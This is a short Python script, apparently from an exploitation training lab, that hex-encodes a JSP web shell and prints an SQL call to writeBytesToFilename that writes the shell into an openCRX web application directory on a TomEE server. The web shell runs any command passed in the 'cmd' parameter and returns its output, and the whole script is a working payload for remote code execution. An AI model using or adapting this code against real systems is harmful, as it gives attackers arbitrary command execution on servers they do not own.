shell = b"""
<FORM METHOD=GET ACTION='webshell.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>

<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";

   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>

<pre>
<%=output %>
</pre>

<!--    http://michaeldaw.org   2006    -->
"""

hex = shell.hex()

sql = f"""
call writeBytesToFilename('/home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/webshell.jsp', cast ('{hex}' as VARBINARY(1024)))
"""

print(sql)
